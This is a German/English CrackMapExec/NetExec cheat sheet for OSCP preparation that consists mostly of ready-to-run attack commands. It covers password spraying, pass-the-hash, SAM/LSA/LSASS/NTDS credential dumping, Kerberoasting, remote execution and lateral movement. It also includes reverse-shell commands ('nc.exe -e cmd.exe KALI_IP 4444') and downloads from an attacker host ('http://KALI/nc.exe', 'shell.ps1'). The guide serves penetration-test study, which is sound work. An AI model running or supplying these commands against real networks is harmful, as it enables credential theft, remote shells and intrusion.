# CrackMapExec (CME/NetExec) - Complete Penetration Testing Guide

## Table of Contents
1. [Installation & Setup](#1-installation--setup)
2. [Basic Concepts](#2-basic-concepts)
3. [Protocol Overview](#3-protocol-overview)
4. [Authentication Methods](#4-authentication-methods)
5. [Enumeration](#5-enumeration)
6. [Password Attacks](#6-password-attacks)
7. [Command Execution](#7-command-execution)
8. [Module Usage](#8-module-usage)
9. [Credential Dumping](#9-credential-dumping)
10. [Lateral Movement](#10-lateral-movement)
11. [Common OSCP Patterns](#11-common-oscp-patterns)
12. [Troubleshooting](#12-troubleshooting)
13. [Quick Reference](#13-quick-reference)

---

## 1. Installation & Setup

### 1.1 Installation

```bash
# Kali Linux (bereits installiert)
crackmapexec --version

# Alternative: NetExec (Fork, aktiv entwickelt)
sudo apt install pipx
pipx install git+https://github.com/Pennyw0rth/NetExec

# Alias für Kompatibilität
alias cme='crackmapexec'
alias nxc='netexec'
```

### 1.2 Database Setup

```bash
# CME verwendet eine lokale Database
# Location: ~/.cme/workspaces/default/

# Database löschen (Fresh Start)
rm -rf ~/.cme/

# Workspace verwalten
cme --workspace oscp
cme --list-workspaces
```

### 1.3 Configuration

```bash
# Config File Location
~/.cme/cme.conf

# Wichtige Settings
[CME]
workspace=default
pwn3d_label=Pwn3d!
log_mode=write
```

---

## 2. Basic Concepts

### 2.1 Command Structure

```bash
crackmapexec <protocol> <target> [options]
```

| Component | Beschreibung | Beispiel |
|-----------|--------------|----------|
| `protocol` | SMB, WinRM, MSSQL, SSH, RDP, LDAP, FTP | `smb` |
| `target` | IP, CIDR, Hostname, File | `192.168.1.10`, `10.10.10.0/24` |
| `options` | Authentication, Actions, Modules | `-u admin -p password` |

### 2.2 Output Interpretation

```bash
# SMB Example Output
SMB    192.168.1.10    445    DC01    [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB    192.168.1.10    445    DC01    [+] corp.local\admin:password (Pwn3d!)
```

| Symbol | Bedeutung |
|--------|-----------|
| `[*]` | Info/Connection established |
| `[+]` | Authentication successful |
| `[-]` | Authentication failed |
| `(Pwn3d!)` | Admin privileges! Can execute commands |

### 2.3 Target Specification

```bash
# Einzelne IP
cme smb 192.168.1.10

# CIDR Range
cme smb 192.168.1.0/24

# IP Range
cme smb 192.168.1.1-50

# Hostname
cme smb DC01.corp.local

# Target File
cme smb targets.txt

# Multiple Targets
cme smb 192.168.1.10 192.168.1.11 192.168.1.12
```

---

## 3. Protocol Overview

### 3.1 SMB (Port 445)

**Use Case:** Windows File Shares, RPC, NTLM Authentication

```bash
# Basic SMB Check
cme smb 192.168.1.10

# Mit Credentials
cme smb 192.168.1.10 -u administrator -p 'Password123!'

# Pwn3d! → Admin access
cme smb 192.168.1.10 -u admin -p pass --shares
```

### 3.2 WinRM (Port 5985/5986)

**Use Case:** PowerShell Remoting (requires "Remote Management Users" group)

```bash
# WinRM Check
cme winrm 192.168.1.10 -u user -p password

# Command Execution (wenn Pwn3d!)
cme winrm 192.168.1.10 -u admin -p pass -x whoami
```

### 3.3 MSSQL (Port 1433)

**Use Case:** Microsoft SQL Server

```bash
# MSSQL Authentication
cme mssql 192.168.1.10 -u sa -p password

# xp_cmdshell Execution
cme mssql 192.168.1.10 -u sa -p pass -x whoami
```

### 3.4 RDP (Port 3389)

**Use Case:** Remote Desktop Check (kein Command Execution!)

```bash
# RDP Credential Check
cme rdp 192.168.1.10 -u administrator -p password

# NLA Check (Network Level Authentication)
cme rdp 192.168.1.10 --nla-check
```

### 3.5 LDAP (Port 389/636)

**Use Case:** Active Directory Enumeration

```bash
# LDAP Authentication
cme ldap 192.168.1.10 -u user -p password

# User Enumeration
cme ldap 192.168.1.10 -u user -p pass --users

# ASREPRoast
cme ldap 192.168.1.10 -u user -p pass --asreproast asrep.txt
```

### 3.6 SSH (Port 22)

**Use Case:** Linux/Unix Systems

```bash
# SSH Password
cme ssh 192.168.1.10 -u root -p toor

# SSH Key
cme ssh 192.168.1.10 -u root --key-file id_rsa
```

### 3.7 FTP (Port 21)

**Use Case:** FTP Credential Check

```bash
# FTP Authentication
cme ftp 192.168.1.10 -u admin -p password

# Anonymous Login
cme ftp 192.168.1.10 -u anonymous -p ''
```

---

## 4. Authentication Methods

### 4.1 Username/Password

```bash
# Einzelner User
cme smb 192.168.1.10 -u administrator -p 'Password123!'

# Mehrere Users (file)
cme smb 192.168.1.10 -u users.txt -p password

# Mehrere Passwords (file)
cme smb 192.168.1.10 -u administrator -p passwords.txt

# User + Password Lists (kombiniert)
cme smb 192.168.1.10 -u users.txt -p passwords.txt
```

### 4.2 Password Spray

```bash
# Ein Passwort gegen alle User testen (sicherer!)
cme smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Mit Delay (Account Lockout vermeiden)
cme smb 192.168.1.0/24 -u users.txt -p pass --no-bruteforce --continue-on-success
```

**Wichtig:** `--no-bruteforce` verhindert "alle Kombis testen", verhindert Account Lockouts!

### 4.3 NTLM Hash (Pass-the-Hash)

```bash
# NTLM Hash verwenden (kein Passwort!)
cme smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Nur NT Hash (ohne LM)
cme smb 192.168.1.10 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Hash File
cme smb 192.168.1.10 -u administrator -H hashes.txt
```

### 4.4 Domain Authentication

```bash
# Domain User (Format 1)
cme smb 192.168.1.10 -u user -p pass -d corp.local

# Domain User (Format 2)
cme smb 192.168.1.10 -u 'corp.local\user' -p password

# Local Admin (NICHT Domain!)
cme smb 192.168.1.10 -u administrator -p pass --local-auth
```

**Wichtig:** Ohne `-d` oder `--local-auth` versucht CME automatisch Domain Auth!

### 4.5 Kerberos Authentication

```bash
# Kerberos Ticket verwenden
export KRB5CCNAME=/tmp/ticket.ccache
cme smb 192.168.1.10 --use-kcache

# Mit Domain
cme smb dc01.corp.local -u user -p pass --kerberos
```

---

## 5. Enumeration

### 5.1 Network Enumeration

```bash
# SMB Version Detection
cme smb 192.168.1.0/24

# OS + Hostname Info
cme smb 192.168.1.0/24 --gen-relay-list targets.txt

# SMB Signing Check (für Relay-Angriffe wichtig!)
cme smb 192.168.1.0/24 --gen-relay-list unsigned.txt
```

### 5.2 Share Enumeration

```bash
# Alle Shares listen
cme smb 192.168.1.10 -u user -p pass --shares

# Readable Shares (mit Permissions)
cme smb 192.168.1.10 -u user -p pass --shares --filter-shares READ WRITE

# Share Content spider
cme smb 192.168.1.10 -u user -p pass -M spider_plus

# Interessante Files suchen
cme smb 192.168.1.10 -u user -p pass -M spider_plus -o READ_ONLY=false
```

### 5.3 User Enumeration

```bash
# Domain Users listen
cme smb 192.168.1.10 -u user -p pass --users

# RID Bruteforce (kein Passwort nötig bei Null Session)
cme smb 192.168.1.10 -u '' -p '' --rid-brute

# Password Policy (Lockout threshold!)
cme smb 192.168.1.10 -u user -p pass --pass-pol

# LDAP User Dump
cme ldap 192.168.1.10 -u user -p pass --users
```

### 5.4 Group Enumeration

```bash
# Domain Groups
cme smb 192.168.1.10 -u user -p pass --groups

# Local Groups
cme smb 192.168.1.10 -u admin -p pass --local-groups

# Group Membership
cme smb 192.168.1.10 -u user -p pass --groups "Domain Admins"
```

### 5.5 Session Enumeration

```bash
# Logged-in Users (wer ist wo eingeloggt?)
cme smb 192.168.1.10 -u user -p pass --sessions

# Disk Enumeration
cme smb 192.168.1.10 -u user -p pass --disks

# Services
cme smb 192.168.1.10 -u admin -p pass -M enum_services
```

---

## 6. Password Attacks

### 6.1 Password Spray

```bash
# Sichere Password Spray (ein Pass für alle)
cme smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success

# Mit Delay
cme smb 192.168.1.0/24 -u users.txt -p pass -t 1 --continue-on-success

# Lockout Policy prüfen (IMMER ZUERST!)
cme smb 192.168.1.10 -u user -p pass --pass-pol
```

**OSCP Wichtig:** Kein Bruteforce! Maximal 3-5 Versuche pro User!

### 6.2 ASREPRoast

```bash
# Users ohne Kerberos Pre-Auth
cme ldap 192.168.1.10 -u user -p pass --asreproast asrep_hashes.txt

# Offline cracken
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### 6.3 Kerberoast

```bash
# Service Principal Names (SPNs) dumpen
cme ldap 192.168.1.10 -u user -p pass --kerberoasting kerb_hashes.txt

# Offline cracken
hashcat -m 13100 kerb_hashes.txt wordlist.txt
```

### 6.4 SAM/NTDS Dumping

```bash
# SAM Hash Dump (Local Admin benötigt!)
cme smb 192.168.1.10 -u administrator -p pass --sam

# NTDS.dit Dump (Domain Controller + DA benötigt!)
cme smb 192.168.1.10 -u 'corp.local\Administrator' -p pass --ntds

# LSA Secrets
cme smb 192.168.1.10 -u admin -p pass --lsa
```

---

## 7. Command Execution

### 7.1 Execute Commands

```bash
# CMD Command (-x)
cme smb 192.168.1.10 -u admin -p pass -x whoami

# PowerShell Command (-X)
cme smb 192.168.1.10 -u admin -p pass -X '$PSVersionTable'

# WinRM Execution
cme winrm 192.168.1.10 -u admin -p pass -x ipconfig

# MSSQL xp_cmdshell
cme mssql 192.168.1.10 -u sa -p pass -x whoami
```

### 7.2 Execute Methods

```bash
# Default: wmiexec
cme smb 192.168.1.10 -u admin -p pass -x whoami

# Atexec (Task Scheduler)
cme smb 192.168.1.10 -u admin -p pass -x whoami --exec-method atexec

# Smbexec
cme smb 192.168.1.10 -u admin -p pass -x whoami --exec-method smbexec

# Mmcexec
cme smb 192.168.1.10 -u admin -p pass -x whoami --exec-method mmcexec
```

**Wichtig:** `wmiexec` = Standard, `atexec` = weniger Logs, `smbexec` = für Legacy-Systeme

### 7.3 Upload & Execute

```bash
# File Upload + Execute
cme smb 192.168.1.10 -u admin -p pass --put-file /root/nc.exe C:\\temp\\nc.exe
cme smb 192.168.1.10 -u admin -p pass -x 'C:\temp\nc.exe -e cmd.exe KALI_IP 4444'

# Get File
cme smb 192.168.1.10 -u admin -p pass --get-file C:\\windows\\system32\\config\\sam /tmp/sam
```

---

## 8. Module Usage

### 8.1 Module Basics

```bash
# Module Liste anzeigen
cme smb -L

# Module Info
cme smb -M spider_plus --module-info

# Module verwenden
cme smb 192.168.1.10 -u user -p pass -M MODULE_NAME -o OPTION=value
```

### 8.2 Wichtige Module

#### spider_plus - File Search

```bash
# Shares durchsuchen
cme smb 192.168.1.10 -u user -p pass -M spider_plus

# Output Location
cat /tmp/cme_spider_plus/*.json

# Nur bestimmte Extensions
cme smb 192.168.1.10 -u user -p pass -M spider_plus -o EXTENSIONS=txt,docx,xlsx
```

#### mimikatz - Credential Dumping

```bash
# Mimikatz sekurlsa::logonpasswords
cme smb 192.168.1.10 -u admin -p pass -M mimikatz

# Custom Mimikatz Command
cme smb 192.168.1.10 -u admin -p pass -M mimikatz -o COMMAND='privilege::debug sekurlsa::logonpasswords exit'
```

#### lsassy - Modern Credential Dumping

```bash
# LSASS Dump (besser als mimikatz!)
cme smb 192.168.1.10 -u admin -p pass -M lsassy

# Multiple Targets
cme smb 192.168.1.0/24 -u admin -p pass -M lsassy
```

#### enum_avproducts - AV Detection

```bash
# Antivirus erkennen
cme smb 192.168.1.10 -u user -p pass -M enum_avproducts
```

#### gpp_password - Group Policy Passwords

```bash
# GPP Passwords in SYSVOL suchen
cme smb 192.168.1.10 -u user -p pass -M gpp_password
```

#### gpp_autologin - Autologin Credentials

```bash
# Autologin Registry Keys
cme smb 192.168.1.10 -u admin -p pass -M gpp_autologin
```

#### web_delivery - Payload Delivery

```bash
# PowerShell Download Cradle
cme smb 192.168.1.10 -u admin -p pass -M web_delivery -o URL=http://KALI/shell.ps1
```

---

## 9. Credential Dumping

### 9.1 Local Credentials

```bash
# SAM Database (Local Users)
cme smb 192.168.1.10 -u administrator -p pass --sam

# LSA Secrets (Cached Credentials, Service Accounts)
cme smb 192.168.1.10 -u admin -p pass --lsa

# LSASS Dump (lsassy module)
cme smb 192.168.1.10 -u admin -p pass -M lsassy
```

### 9.2 Domain Credentials

```bash
# NTDS.dit (Domain Controller!)
cme smb DC01 -u 'corp.local\Administrator' -p pass --ntds

# Nur bestimmte User
cme smb DC01 -u admin -p pass --ntds --users

# Mit VSS (Volume Shadow Copy)
cme smb DC01 -u admin -p pass --ntds vss
```

### 9.3 Credential Reuse

```bash
# Gefundene Creds automatisch testen
# CME speichert Creds in Database!

# Database Creds verwenden
cme smb 192.168.1.0/24 --continue-on-success

# Export Creds
cme smb --export creds.csv
```

---

## 10. Lateral Movement

### 10.1 Pass-the-Hash

```bash
# NTLM Hash weiterverwenden
cme smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Multiple Targets
cme smb 192.168.1.0/24 -u admin -H hash --continue-on-success
```

### 10.2 Pass-the-Ticket

```bash
# Kerberos Ticket exportieren
export KRB5CCNAME=/tmp/administrator.ccache

# Mit Ticket verbinden
cme smb dc01.corp.local --use-kcache
```

### 10.3 Token Impersonation

```bash
# Tokens auflisten
cme smb 192.168.1.10 -u admin -p pass -M tokens

# Token verwenden (via Mimikatz/Cobalt Strike)
# → Nicht direkt in CME, nutze mimikatz module
```

---

## 11. Common OSCP Patterns

### 11.1 Pattern 1: Initial Foothold Check

```bash
# Network Discovery
cme smb 192.168.1.0/24

# Null Session Check
cme smb 192.168.1.0/24 -u '' -p '' --shares

# Guest Account Check
cme smb 192.168.1.0/24 -u 'guest' -p ''

# RID Bruteforce (User Enum)
cme smb 192.168.1.10 -u '' -p '' --rid-brute 10000
```

### 11.2 Pattern 2: Credential Validation

```bash
# Gefundene Creds testen
cme smb 192.168.1.10 -u user -p 'FoundPassword123!'

# Alle Protokolle testen
cme smb 192.168.1.10 -u user -p pass
cme winrm 192.168.1.10 -u user -p pass
cme mssql 192.168.1.10 -u user -p pass
cme rdp 192.168.1.10 -u user -p pass
cme ssh 192.168.1.10 -u user -p pass

# Über gesamtes Netzwerk
cme smb 192.168.1.0/24 -u user -p pass --continue-on-success
```

### 11.3 Pattern 3: Privilege Escalation Check

```bash
# Local Admin?
cme smb 192.168.1.10 -u user -p pass

# Pwn3d! → Shell Time!
cme smb 192.168.1.10 -u admin -p pass -x whoami

# Share Access
cme smb 192.168.1.10 -u user -p pass --shares
```

### 11.4 Pattern 4: Full Domain Enumeration

```bash
# 1. User Enumeration
cme smb DC01 -u user -p pass --users > users.txt

# 2. Password Policy
cme smb DC01 -u user -p pass --pass-pol

# 3. Groups
cme smb DC01 -u user -p pass --groups

# 4. Shares (auf allen Maschinen!)
cme smb 192.168.1.0/24 -u user -p pass --shares

# 5. Sessions (wer ist wo eingeloggt?)
cme smb 192.168.1.0/24 -u user -p pass --sessions

# 6. Password Spray (wenn Policy erlaubt!)
cme smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success
```

### 11.5 Pattern 5: Post-Exploitation (Pwn3d!)

```bash
# 1. SAM Dump
cme smb 192.168.1.10 -u admin -p pass --sam

# 2. LSA Secrets
cme smb 192.168.1.10 -u admin -p pass --lsa

# 3. LSASS Dump
cme smb 192.168.1.10 -u admin -p pass -M lsassy

# 4. File Search
cme smb 192.168.1.10 -u admin -p pass -M spider_plus

# 5. Lateral Movement (Hash verwenden!)
cme smb 192.168.1.0/24 -u administrator -H HASH --sam
```

### 11.6 Pattern 6: MSSQL Exploitation

```bash
# 1. MSSQL Credential Check
cme mssql 192.168.1.10 -u sa -p password

# 2. xp_cmdshell Execution
cme mssql 192.168.1.10 -u sa -p pass -x whoami

# 3. File Download
cme mssql 192.168.1.10 -u sa -p pass -x "curl http://KALI/nc.exe -o C:\temp\nc.exe"

# 4. Reverse Shell
# Kali: nc -lvnp 4444
cme mssql 192.168.1.10 -u sa -p pass -x "C:\temp\nc.exe -e cmd.exe KALI_IP 4444"
```

### 11.7 Pattern 7: SMB Relay Vorbereitung

```bash
# SMB Signing Check (Relay Targets finden!)
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Relay mit impacket-ntlmrelayx
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

### 11.8 Pattern 8: Kerberoasting Attack

```bash
# 1. SPNs finden
cme ldap DC01 -u user -p pass --kerberoasting spns.txt

# 2. Offline Crack
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt

# 3. Mit gecracketem Passwort lateral moven
cme smb 192.168.1.0/24 -u svc_account -p 'CrackedPass!' --continue-on-success
```

---

## 12. Troubleshooting

### 12.1 Connection Failed

```bash
# Problem: STATUS_ACCESS_DENIED
# Lösung: Falsche Credentials oder keine Admin-Rechte

# Testen:
cme smb 192.168.1.10 -u user -p pass --local-auth  # Local Admin
cme smb 192.168.1.10 -u user -p pass -d DOMAIN     # Domain User

# SMB Port erreichbar?
nmap -p445 192.168.1.10
```

### 12.2 Authentication Errors

```bash
# STATUS_LOGON_FAILURE
# → Falscher Username/Passwort

# STATUS_ACCOUNT_LOCKED_OUT
# → Account gesperrt! (zu viele Login-Versuche)
# Check Policy: cme smb DC -u user -p pass --pass-pol

# STATUS_PASSWORD_EXPIRED
# → Passwort abgelaufen

# KDC_ERR_PREAUTH_FAILED (Kerberos)
# → Kerberos Auth fehlgeschlagen, nutze NTLM
```

### 12.3 No Pwn3d! aber [+]

```bash
# [+] aber kein (Pwn3d!)
# → Authentication OK, aber KEINE Admin-Rechte!

# Trotzdem nützlich:
cme smb 192.168.1.10 -u user -p pass --shares     # Lesbare Shares?
cme smb 192.168.1.10 -u user -p pass --sessions   # User Enumeration
```

### 12.4 Module Not Found

```bash
# Modul existiert nicht
cme smb -L | grep MODULE_NAME

# NetExec vs CME Module Unterschiede
# → NetExec hat mehr/aktuellere Module!
nxc smb -L
```

### 12.5 Hash Format Errors

```bash
# Korrektes Format:
# LM:NT (full)
cme smb IP -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Nur NT (LM = empty)
cme smb IP -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Aus secretsdump Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# → Nutze: cme smb IP -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### 12.6 NTDS Dump Failed

```bash
# Benötigt: Domain Admin Rechte auf DC!

# Check:
cme smb DC01 -u 'DOMAIN\Administrator' -p pass

# Wenn kein Pwn3d!:
# → Kein DA! Nutze andere Methoden (Kerberoasting, etc.)

# VSS Errors:
# Manchmal klappt --ntds nicht, nutze impacket-secretsdump
impacket-secretsdump 'DOMAIN/Administrator:pass@DC01'
```

---

## 13. Quick Reference

### 13.1 Essential Commands

```bash
# === ENUMERATION ===
# Network Scan
cme smb 192.168.1.0/24

# Shares
cme smb TARGET -u user -p pass --shares

# Users
cme smb TARGET -u user -p pass --users

# Sessions
cme smb TARGET -u user -p pass --sessions

# Password Policy
cme smb DC -u user -p pass --pass-pol

# === AUTHENTICATION ===
# Password
cme smb TARGET -u admin -p password

# Hash (PTH)
cme smb TARGET -u admin -H HASH

# Domain
cme smb TARGET -u user -p pass -d DOMAIN

# Local Admin
cme smb TARGET -u admin -p pass --local-auth

# === CREDENTIAL DUMPING ===
# SAM
cme smb TARGET -u admin -p pass --sam

# LSA
cme smb TARGET -u admin -p pass --lsa

# LSASS
cme smb TARGET -u admin -p pass -M lsassy

# NTDS (DC only!)
cme smb DC -u admin -p pass --ntds

# === EXECUTION ===
# CMD
cme smb TARGET -u admin -p pass -x whoami

# PowerShell
cme smb TARGET -u admin -p pass -X Get-Host

# WinRM
cme winrm TARGET -u admin -p pass -x ipconfig

# MSSQL
cme mssql TARGET -u sa -p pass -x whoami

# === KERBEROS ATTACKS ===
# Kerberoast
cme ldap DC -u user -p pass --kerberoasting kerb.txt

# ASREPRoast
cme ldap DC -u user -p pass --asreproast asrep.txt
```

### 13.2 Protocol Cheat Sheet

| Protocol | Port | Use Case | Admin Required |
|----------|------|----------|----------------|
| SMB | 445 | File Shares, Command Exec | For Pwn3d! |
| WinRM | 5985/5986 | PowerShell Remoting | Yes |
| MSSQL | 1433 | SQL Server, xp_cmdshell | For xp_cmdshell |
| RDP | 3389 | Cred Validation (no exec!) | No |
| LDAP | 389/636 | AD Enumeration | No |
| SSH | 22 | Linux/Unix | For exec |
| FTP | 21 | Cred Validation | No |

### 13.3 Important Flags

| Flag | Beschreibung |
|------|--------------|
| `-u` | Username (oder file) |
| `-p` | Password (oder file) |
| `-H` | NTLM Hash |
| `-d` | Domain |
| `--local-auth` | Local Admin (nicht Domain) |
| `-x` | Execute CMD command |
| `-X` | Execute PowerShell |
| `-M` | Module verwenden |
| `--shares` | Shares auflisten |
| `--sam` | SAM dump |
| `--lsa` | LSA secrets |
| `--ntds` | NTDS.dit dump (DC) |
| `--users` | User enumeration |
| `--groups` | Group enumeration |
| `--sessions` | Logged-in users |
| `--pass-pol` | Password policy |
| `--continue-on-success` | Weiter bei Success (spray!) |
| `--gen-relay-list` | SMB Relay targets |
| `-t` | Threads (default 100) |

### 13.4 Output Symbols

| Symbol | Bedeutung |
|--------|-----------|
| `[*]` | Info / Connection established |
| `[+]` | Success / Valid credentials |
| `[-]` | Failed / Invalid credentials |
| `(Pwn3d!)` | Admin access! |
| `STATUS_LOGON_FAILURE` | Wrong password |
| `STATUS_ACCESS_DENIED` | No admin rights |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account locked |

---

## 14. OSCP Tips

### 14.1 Exam-Safe Usage

```bash
# KEIN Bruteforce! (max 3-5 Versuche pro User)
# ✅ ERLAUBT: Password Spray (1 Passwort für alle User)
cme smb 192.168.1.0/24 -u users.txt -p 'Password1!' --continue-on-success

# ❌ VERBOTEN: Bruteforce (alle Kombis)
cme smb 192.168.1.10 -u admin -p passwords.txt  # Nicht im Exam!

# Password Policy IMMER checken
cme smb DC -u user -p pass --pass-pol
```

### 14.2 Common Pitfalls

```bash
# Fehler: --local-auth vergessen
# → Wenn lokaler Admin, IMMER --local-auth nutzen!
cme smb 192.168.1.10 -u administrator -p pass --local-auth

# Fehler: Domain nicht angeben
# → Bei Domain-Accounts IMMER -d nutzen!
cme smb 192.168.1.10 -u user -p pass -d corp.local

# Fehler: Hash-Format falsch
# → LM:NT oder nur NT
cme smb IP -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### 14.3 Time-Saving Tricks

```bash
# Multiple Protocols gleichzeitig (separate terminals!)
cme smb 192.168.1.10 -u user -p pass &
cme winrm 192.168.1.10 -u user -p pass &
cme mssql 192.168.1.10 -u user -p pass &

# Network Spray (alle Maschinen + Protokolle)
for proto in smb winrm mssql; do
    cme $proto 192.168.1.0/24 -u user -p pass --continue-on-success
done

# Auto-Pwn Script
cme smb 192.168.1.0/24 -u admin -H HASH --sam | tee sam_dump.txt
```

---

## 15. Integration mit anderen Tools

### 15.1 Mit Proxychains (Pivoting)

```bash
# Über SOCKS Proxy (Chisel, SSH, etc.)
proxychains crackmapexec smb 10.10.10.10 -u user -p pass

# Config: /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```

### 15.2 Mit Impacket

```bash
# CME findet Admin → Impacket für Shell
cme smb 192.168.1.10 -u admin -p pass  # (Pwn3d!)
impacket-psexec admin:pass@192.168.1.10

# CME dumpt Hashes → Impacket PTH
cme smb 192.168.1.10 -u admin -p pass --sam
impacket-psexec -hashes :HASH admin@192.168.1.10
```

### 15.3 Mit Evil-WinRM

```bash
# CME validiert WinRM → Evil-WinRM Shell
cme winrm 192.168.1.10 -u admin -p pass  # (Pwn3d!)
evil-winrm -i 192.168.1.10 -u admin -p pass
```

### 15.4 Mit Hashcat

```bash
# CME dumpt Hashes → Hashcat crackt
cme smb 192.168.1.10 -u admin -p pass --sam > hashes.txt

# Extract Hashes (Format: user:hash)
cat hashes.txt | grep ":" | cut -d: -f4 > ntlm.txt

# Crack
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

---

## 16. Resources

- **NetExec GitHub (CME Fork)**: https://github.com/Pennyw0rth/NetExec
- **CME Wiki**: https://wiki.porchetta.industries/
- **HackTricks - CME**: https://book.hacktricks.xyz/pentesting/pentesting-smb/crackmapexec
- **OSCP Cheat Sheet**: https://github.com/0xsyr0/OSCP

---

## 17. Final Notes

**Wichtig für OSCP:**
- CME ist DAS Tool für Credential Validation + Lateral Movement
- Immer Password Policy checken vor Spray!
- `(Pwn3d!)` = Admin Access = Win
- NTLM Hashes > Passwörter (Pass-the-Hash!)
- Bei Exam: Kein Bruteforce, nur Password Spray (1 Pass für alle User)

**Best Practice:**
1. Network Scan mit `cme smb 192.168.1.0/24`
2. Credentials validieren mit `cme smb IP -u user -p pass`
3. Alle Protokolle testen (smb/winrm/mssql/rdp)
4. Bei Pwn3d!: SAM/LSA/LSASS dumpen
5. Hashes für Lateral Movement nutzen
